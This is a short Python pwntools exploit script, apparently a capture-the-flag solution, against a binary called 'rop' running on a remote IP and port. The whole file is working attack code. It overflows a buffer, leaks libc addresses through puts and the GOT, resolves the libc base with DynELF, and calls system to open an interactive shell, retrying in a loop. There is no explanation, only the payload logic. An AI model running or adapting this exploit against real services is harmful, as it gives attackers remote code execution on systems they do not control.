from pwn import *

#r = process('./rop')
e = ELF('./rop')
libc = e.libc
prdi = 0x00000000004006a3# : pop rdi ; ret
fflush_offset = 0x7f9f164fcab0-0x7f9f16493000
puts_offset = 0x7fe3a5239990-0x7fe3a51ce000
execve_offset = 0x7fcbc54aa310-0x7fcbc53f0000
system_offset = 0x7f08cede7490-0x7f08ceda6000

def packAll(rop):
    return flat([p64(x) for x in rop])
syscall_bin = asm('syscall;ret')

def leak(addr):
    # leak libc
    rop = []
    rop += [prdi, addr]
    rop += [e.plt['puts']]
    rop += [e.symbols['main']]
    payload = 'A'*88+packAll(rop)
    r.clean()
    r.sendline(payload)
    result = r.recv(6)
    print result
    return result

def leak2(addr):
    # leak libc
    rop = []
    rop += [prdi, addr]
    rop += [e.plt['puts']]
    rop += [e.symbols['main']]
    payload = 'A'*88+packAll(rop)
    r.clean()
    r.sendline(payload)
    result = r.recvuntil('\nROP')[:-4]
    if 'sh\x00' in result:
        print hex(addr)
        exit()
    #print result
    if not result:
        return '\x00'
    return result
while True:
    try:
        r = remote('35.194.142.188', 8037)
        puts = u64(leak2(e.got['puts'])+'\x00\x00')
        d = DynELF(leak2, e.symbols['main'], elf=ELF('./rop'))
        libc_base  = d.find_base(leak2, puts-puts_offset)
        system = libc_base + system_offset
        rop = []
        rop += [prdi, 0x40037c]
        rop += [system]
        payload = 'A'*88+packAll(rop)
        r.clean()
        r.sendline(payload)
        r.interactive()
    except Exception:
        print '-------------'
        pass

r.interactive()
